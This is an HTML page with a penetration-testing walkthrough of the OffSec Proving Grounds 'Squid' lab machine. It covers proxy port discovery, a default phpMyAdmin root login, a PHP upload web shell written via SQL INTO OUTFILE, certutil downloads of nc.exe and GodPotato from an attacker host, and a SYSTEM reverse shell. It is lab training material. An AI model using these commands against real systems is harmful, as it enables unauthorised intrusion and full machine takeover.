@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html id="R-html" lang="en-us" dir="ltr" itemscope itemtype="http://schema.org/Article" data-r-output-format="html">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.154.5">
+    <meta name="generator" content="Relearn 9.0.3+5fff5bc8a066e83e5f67f0de49c7dfb57379219e">
+    <meta name="description" content="Offsec proving grounds Squid writeup - A penetration testing walkthrough exploiting a Squid proxy to access internal services, gain phpMyAdmin access, upload a web shell, and escalate privileges using GodPotato.">
+    <meta name="author" content="">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Squid :: Dragonfly Commando">
+    <meta name="twitter:description" content="Offsec proving grounds Squid writeup - A penetration testing walkthrough exploiting a Squid proxy to access internal services, gain phpMyAdmin access, upload a web shell, and escalate privileges using GodPotato.">
+    <meta property="og:url" content="http://localhost:1313/writeup/proving-grounds/squid/index.html">
+    <meta property="og:site_name" content="Dragonfly Commando">
+    <meta property="og:title" content="Squid :: Dragonfly Commando">
+    <meta property="og:description" content="Offsec proving grounds Squid writeup - A penetration testing walkthrough exploiting a Squid proxy to access internal services, gain phpMyAdmin access, upload a web shell, and escalate privileges using GodPotato.">
+    <meta property="og:locale" content="en_us">
+    <meta property="og:type" content="article">
+    <meta property="article:section" content="Writeup">
+    <meta property="article:published_time" content="2026-03-04T22:44:23+09:00">
+    <meta property="article:modified_time" content="2026-03-04T22:44:23+09:00">
+    <meta property="article:tag" content="Squid">
+    <meta property="article:tag" content="Phpmyadmin">
+    <meta property="article:tag" content="Spose">
+    <meta property="article:tag" content="Proxy">
+    <meta itemprop="name" content="Squid :: Dragonfly Commando">
+    <meta itemprop="description" content="Offsec proving grounds Squid writeup - A penetration testing walkthrough exploiting a Squid proxy to access internal services, gain phpMyAdmin access, upload a web shell, and escalate privileges using GodPotato.">
+    <meta itemprop="datePublished" content="2026-03-04T22:44:23+09:00">
+    <meta itemprop="dateModified" content="2026-03-04T22:44:23+09:00">
+    <meta itemprop="wordCount" content="382">
+    <meta itemprop="keywords" content="Squid,Phpmyadmin,Spose,Proxy">
+    <title>Squid :: Dragonfly Commando</title>
+    <link href="/images/favicon.png?1772633951" rel="icon" type="image/png">
+    <link href="/css/auto-complete/auto-complete.min.css?1772633951" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1772633951" defer></script>
+    <script src="/js/search-lunr.js?1772633951" defer></script>
+    <script src="/js/search.js?1772633951" defer></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.index_js_url="/searchindex.en.js?1772633951";
+    </script>
+    <script src="/js/lunr/lunr.min.js?1772633951" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1772633951" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1772633951" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1772633951" defer></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.contentLangs=['en'];
+    </script>
+    <link href="/fonts/fontawesome/css/all.min.css?1772633951" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1772633951" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1772633951" rel="stylesheet">
+    <link href="/css/theme.css?1772633951" rel="stylesheet">
+    <link href="/css/format-html.css?1772633951" rel="stylesheet" id="R-format-style">
+    <script>
+      window.relearn = window.relearn || {};
+      // configuration
+      window.relearn.min = ``;
+      window.relearn.path='\/writeup\/proving-grounds\/squid\/index.html';
+      window.relearn.relBasePath='..\/..\/..';
+      window.relearn.relBaseUri='..\/..\/..';
+      window.relearn.absBaseUri='http:\/\/localhost:1313';
+      window.relearn.disableInlineCopyToClipboard=false;
+      window.relearn.enableBlockCodeWrap=true;
+      // translations
+      window.T_Copy_to_clipboard = `Copy text to clipboard`;
+      window.T_Copied_to_clipboard = `Text copied to clipboard!`;
+      window.T_Link_copied_to_clipboard = `Link copied to clipboard!`;
+      window.T_Reset_view = `Reset view`;
+      window.T_View_reset = `View reset!`;
+      window.T_No_results_found = `No results found for "{0}"`;
+      window.T_N_results_found = `{1} results found for "{0}"`;
+      window.T_Browser_unsupported_feature = `This browser doesn't support this feature`;
+      // variant stuff
+      window.relearn.themevariants = [ 'auto' ];
+      window.relearn.customvariantprefix = "my-custom-";
+      window.relearn.changeVariant = function(variant) {
+        var oldVariant = document.documentElement.dataset.rThemeVariant;
+        window.localStorage.setItem(window.relearn.absBaseUri + "/variant", variant);
+        document.documentElement.dataset.rThemeVariant = variant;
+        if (oldVariant != variant) {
+          document.dispatchEvent( new CustomEvent('themeVariantLoaded', { detail: { variant, oldVariant } }) );
+          window.relearn.markVariant();
+        }
+      }
+      window.relearn.markVariant = function() {
+        var variant = window.localStorage.getItem(window.relearn.absBaseUri + "/variant");
+        document.querySelectorAll(".R-variantswitcher select").forEach((select) => {select.value = variant;});
+      }
+      window.relearn.initVariant = function() {
+        var variant = window.localStorage.getItem(window.relearn.absBaseUri + "/variant") ?? "";
+        if( !variant ||
+            (!variant.startsWith(window.relearn.customvariantprefix) && !window.relearn.themevariants.includes(variant)) ||
+            (variant.startsWith(window.relearn.customvariantprefix) && !window.localStorage.getItem(window.relearn.absBaseUri + "/variantstylesheet-" + variant)) ){
+          variant = window.relearn.themevariants[0];
+          window.localStorage.setItem(window.relearn.absBaseUri + "/variant", variant);
+        }
+        document.documentElement.dataset.rThemeVariant = variant;
+      }
+      window.relearn.initVariant();
+      window.relearn.markVariant();
+    </script>
+  </head>
+  <body class="mobile-support html" data-origin="/writeup/proving-grounds/squid/index.html">
+    <div id="R-body" class="default-animation">
+      <div id="R-body-overlay"></div>
+      <nav id="R-topbar" class="default-animation">
+        <div class="topbar-wrapper default-animation">
+          <div class="topbar-sidebar-divider default-animation"></div>
+          <div class="topbar-area topbar-area-start" data-area="start">
+            <div class="topbar-button topbar-button-sidebar default-animation" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)"><i class="fa-fw fas fa-bars"></i></button></span>
+            </div>
+            <div class="topbar-button topbar-button-toc default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)"><i class="fa-fw fas fa-table-list"></i></button></span>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+<nav class="TableOfContents">
+  <ul>
+    <li><a href="#nmap-scan">Nmap scan</a></li>
+  </ul>
+</nav>
+                </div>
+              </div>
+            </div>
+          </div>
+          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/index.html"><span itemprop="name">Dragonfly Commando</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/writeup/index.html"><span itemprop="name">Writeup</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/writeup/proving-grounds/index.html"><span itemprop="name">Proving Grounds</span></a><meta itemprop="position" content="3">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><span itemprop="name">Squid</span><meta itemprop="position" content="4"></li>
+          </ol>
+          <div class="topbar-area topbar-area-end" data-area="end">
+            <div class="topbar-button topbar-button-prev default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/writeup/proving-grounds/index.html" title="Proving Grounds (🡐)"><i class="fa-fw fas fa-chevron-left"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-next default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/writeup/proving-grounds/heist/index.html" title="Heist (🡒)"><i class="fa-fw fas fa-chevron-right"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-more default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button></span>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+                  <div class="topbar-area topbar-area-more" data-area="more">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <div id="R-main-overlay"></div>
+      <main id="R-body-inner" class="highlightable writeup" tabindex="-1">
+        <div class="flex-block-wrapper">
+<article class="default">
+  <header class="headline">
+<div class="R-taxonomy taxonomy-tags cstyle tags" title="Tags" style="--VARIABLE-TAGS-BG-color: var(--INTERNAL-TAG-BG-color);">
+  <i class="fa-fw fas fa-layer-group"></i>
+  <ul>
+    <li><a class="term-link" href="/tags/phpmyadmin/index.html">Phpmyadmin</a></li>
+    <li><a class="term-link" href="/tags/proxy/index.html">Proxy</a></li>
+    <li><a class="term-link" href="/tags/spose/index.html">Spose</a></li>
+    <li><a class="term-link" href="/tags/squid/index.html">Squid</a></li>
+  </ul>
+</div>
+  </header>
+
+<h1 id="squid">Squid</h1>
+
+<h1 id="initial-foothold">initial foothold<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<h2 id="nmap-scan">Nmap scan<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>3128/tcp  open  http-proxy    Squid http proxy 4.14
+</span></span><span style="display:flex;"><span>|_http-server-header: squid/4.14
+</span></span><span style="display:flex;"><span>|_http-title: ERROR: The requested URL could not be retrieved
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC</span></span></code></pre></div>
+<p>The scan results show that a Squid proxy is running on port 3128.</p>
+<h1 id="enumeration">enumeration<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<p><a href="#R-image-24d73c5aef63f0096238f29a6e9fcb21" class="lightbox-link"><img alt="squid" class="lazy lightbox figure-image" loading="lazy" src="/images/squid/squid-3128.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-24d73c5aef63f0096238f29a6e9fcb21"><img alt="squid" class="lazy lightbox lightbox-image" loading="lazy" src="/images/squid/squid-3128.png"></a></p>
+<p>When accessing port 3128, only an error page is displayed.</p>
+<p>At first, I had no idea what to do with this port. While researching, I found an <a href="https://angelica.gitbook.io/hacktricks/network-services-pentesting/3128-pentesting-squid" rel="external">article</a> about enumerating Squid proxies.</p>
+<p>According to the article we can use the tool <code>spose.py</code>.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 spose.py --proxy http://192.168.137.189:3128 --target 192.168.137.189
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Scanning default common ports
+</span></span><span style="display:flex;"><span>Using proxy address http://192.168.137.189:3128
+</span></span><span style="display:flex;"><span>192.168.137.189:3306 seems OPEN
+</span></span><span style="display:flex;"><span>192.168.137.189:8080 seems OPEN</span></span></code></pre></div>
+<p>This revealed that ports 3306 and 8080 were also accessible. These ports can be reached through the proxy.</p>
+<p><a href="#R-image-dfdc64dd111deb295a0a4b8ec4bbaaf2" class="lightbox-link"><img alt="proxy" class="lazy lightbox figure-image" loading="lazy" src="/images/squid/squid-proxy.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-dfdc64dd111deb295a0a4b8ec4bbaaf2"><img alt="proxy" class="lazy lightbox lightbox-image" loading="lazy" src="/images/squid/squid-proxy.png"></a></p>
+<p>I configured proxy settings in FoxyProxy, pointing it to port 3128, and then attempted to access the web application.</p>
+<p><a href="#R-image-33ec8289d744d21989cda9c289bc01e0" class="lightbox-link"><img alt="phpmyadmin" class="lazy lightbox figure-image" loading="lazy" src="/images/squid/squid-phpmyadmin.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-33ec8289d744d21989cda9c289bc01e0"><img alt="phpmyadmin" class="lazy lightbox lightbox-image" loading="lazy" src="/images/squid/squid-phpmyadmin.png"></a></p>
+<p>From the landing page, I found a link to <strong>phpmyadmin</strong> page.</p>
+<p>I tried the default credentials:</p>
+<p><code>root / ''</code></p>
+<p>and successfully logged in.</p>
+<p><a href="#R-image-c9ebddaefa8d17a1b2ab183a49dc8869" class="lightbox-link"><img alt="login" class="lazy lightbox figure-image" loading="lazy" src="/images/squid/squid-login.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-c9ebddaefa8d17a1b2ab183a49dc8869"><img alt="login" class="lazy lightbox lightbox-image" loading="lazy" src="/images/squid/squid-login.png"></a></p>
+<h1 id="exploitation">exploitation<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<p>Using SQL statements, We can read and wirte files if we have sufficient privileges..</p>
+<p>Since I logged in as root, I had the necessary permissions.</p>
+<p>For example, we can read a file using:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>load_file(<span style="color:#e6db74">&#39;c:\windows\win.ini&#39;</span>);</span></span></code></pre></div>
+<p>And write a file using:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&lt;?php echo \&#39;&lt;form action=\&#34;</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; method=\&#34;</span>post<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; enctype=\&#34;</span>multipart<span style="color:#f92672">/</span>form<span style="color:#f92672">-</span><span style="color:#66d9ef">data</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; name=\&#34;</span>uploader<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; id=\&#34;</span>uploader<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;&gt;\&#39;;echo \&#39;&lt;input type=\&#34;</span>file<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; name=\&#34;</span>file<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; size=\&#34;</span><span style="color:#ae81ff">50</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;&gt;&lt;input name=\&#34;</span>_upl<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; type=\&#34;</span>submit<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; id=\&#34;</span>_upl<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; value=\&#34;</span>Upload<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;&gt;&lt;/form&gt;\&#39;; if( $_POST[\&#39;_upl\&#39;] == \&#34;</span>Upload<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34; ) { if(@copy($_FILES[\&#39;file\&#39;][\&#39;tmp_name\&#39;], $_FILES[\&#39;file\&#39;][\&#39;name\&#39;])) { echo \&#39;&lt;b&gt;Upload Done.&lt;b&gt;&lt;br&gt;&lt;br&gt;\&#39;; }else { echo \&#39;&lt;b&gt;Upload Failed.&lt;/b&gt;&lt;br&gt;&lt;br&gt;\&#39;; }}?&gt;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">INTO</span> OUTFILE <span style="color:#e6db74">&#39;C:/wamp/www/uploader.php&#39;</span>;</span></span></code></pre></div>
+
+<details open class="box cstyle notices note">
+  <summary class="box-label" tabindex="-1">
+    <i class="fa-fw fas fa-exclamation-circle"></i> 
+    Web server’s root directory
+  </summary>
+  <div class="box-content">
+<p>The root directory for WAMP is <em>C:/wamp/www</em>.</p>
+  </div>
+</details>
+<p>After executing the command, navigate to the URL to confirm that it works.</p>
+<p><a href="#R-image-bc27894168ceb7050d344789914b8c49" class="lightbox-link"><img alt="webshell" class="lazy lightbox figure-image" loading="lazy" src="/images/squid/squid-uploader2.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-bc27894168ceb7050d344789914b8c49"><img alt="webshell" class="lazy lightbox lightbox-image" loading="lazy" src="/images/squid/squid-uploader2.png"></a></p>
+<p>Nice! Now we can upload a reverse shell and execute it.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\wamp\www<span style="color:#75715e">&gt;whoami</span>
+</span></span><span style="display:flex;"><span>nt authority\local service</span></span></code></pre></div>
+<h1 id="privilege-escalation">privilege escalation<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<p>At this point, we still couldn&rsquo;t access the Administrator folder.</p>
+<p>Check user privileges.</p>
+<p>The account has the <em>SeImpersonatePrivilege</em>, which is commonly exploitable.</p>
+<p>I moved <strong>nc.exe</strong> and <strong>godpotato.exe</strong> to target using web server.</p>
+<p>The user has write permissions to the directory:</p>
+<p><code>C:\wamp\tmp</code></p>
+<p>I downloaded the files using certutil:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>certutil -urlcache -split -f http://192.168.45.202/nc.exe nc.exe
+</span></span><span style="display:flex;"><span>certutil -urlcache -split -f http://192.168.45.202/godpotato.exe godpotato.exe</span></span></code></pre></div>
+<p>Finally, I obtained a reverse shell with SYSTEM privileges.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>godpotato.exe -cmd <span style="color:#e6db74">&#34;nc.exe 192.168.45.202 443 -e cmd&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Users\Administrator\Desktop<span style="color:#75715e">&gt;type proof.txt</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;proof&gt;</span></span></code></pre></div>
+
+  <footer class="footline">
+              <i class='fa-fw fas fa-calendar'></i> Mar 4, 2026
+  </footer>
+</article>
+        </div>
+      </main>
+    </div>
+    <aside id="R-sidebar" class="default-animation">
+      <div id="R-header-topbar" class="default-animation"></div>
+      <div id="R-header-wrapper" class="default-animation">
+        <a id="R-logo" class="R-default direction-row" href="/index.html">
+          <span class="logo-title default-animation">Dragonfly Commando</span>
+        </a>
+        <search><form action="/search/index.html" method="get">
+          <div class="searchbox default-animation">
+            <button class="search-detail" type="submit" title="Search (CTRL+ALT+f)"><i class="fas fa-fw fa-search"></i></button>
+            <label class="a11y-only" for="R-search-by">Search</label>
+            <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
+            <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-fw fa-times" title="Clear search"></i></button>
+          </div>
+        </form></search>
+      </div>
+      <div id="R-homelinks" class="default-animation homelinks">
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-homelinks default-animation">
+          <ul class="space collapsible-menu">
+            <li class="" data-nav-id="/index.html"><a class="padding" href="/index.html"><i class="fa-fw fas fa-home"></i> Home</a></li>
+          </ul>
+        </div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-headercontrols default-animation">
+          <ul class="">
+          </ul>
+        </div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+      </div>
+      <div id="R-content-wrapper" class="highlightable">
+        <div class="R-sidebarmenu R-shortcutmenu-main default-animation">
+          <ul class="enlarge morespace collapsible-menu">
+            <li class="" data-nav-id="/posts/index.html"><a class="padding default-animation" href="/posts/index.html">Posts</a><ul id="R-subsections-b4e55eb7e39db1aee6d02808a2267090" class="collapsible-menu"></ul></li>
+            <li class="parent " data-nav-id="/writeup/index.html"><a class="padding default-animation" href="/writeup/index.html">Writeup</a><ul id="R-subsections-4c552b9ca9f2e0503cd4c0d79a1b1839" class="collapsible-menu">
+            <li class="parent alwaysopen " data-nav-id="/writeup/proving-grounds/index.html"><a class="padding default-animation" href="/writeup/proving-grounds/index.html">Proving Grounds</a><ul id="R-subsections-5c44e917da5921333a506ba619b792ee" class="collapsible-menu">
+            <li class="active " data-nav-id="/writeup/proving-grounds/squid/index.html"><a class="padding" href="/writeup/proving-grounds/squid/index.html">Squid</a></li>
+            <li class="" data-nav-id="/writeup/proving-grounds/heist/index.html"><a class="padding" href="/writeup/proving-grounds/heist/index.html">Heist</a></li>
+            <li class="" data-nav-id="/writeup/proving-grounds/vault/index.html"><a class="padding" href="/writeup/proving-grounds/vault/index.html">Vault</a></li>
+            <li class="" data-nav-id="/writeup/proving-grounds/access/index.html"><a class="padding" href="/writeup/proving-grounds/access/index.html">Access</a></li>
+            <li class="" data-nav-id="/writeup/proving-grounds/nickel/index.html"><a class="padding" href="/writeup/proving-grounds/nickel/index.html">Nickel</a></li></ul></li></ul></li>
+          </ul>
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-shortcuts default-animation">
+          <div class="nav-title padding">More</div>
+          <ul class="space collapsible-menu">
+            <li class="" data-nav-id="https://github.com/eoniboogie/CVE_Disclosures"><a class="padding" href="https://github.com/eoniboogie/CVE_Disclosures" rel="external"><i class="fab fa-github"></i> CVE Disclosures</a></li>
+          </ul>
+        </div>
+        <div id="R-footer-margin" class="default-animation"></div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-footercontrols default-animation">
+          <ul class="">
+          </ul>
+        </div>
+<div id="R-footer" class="default-animation"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
+      </div>
+    </aside>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1772633951" defer></script>
+    <script src="/js/theme.js?1772633951" defer></script>
+    <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
+  </body>
+</html>
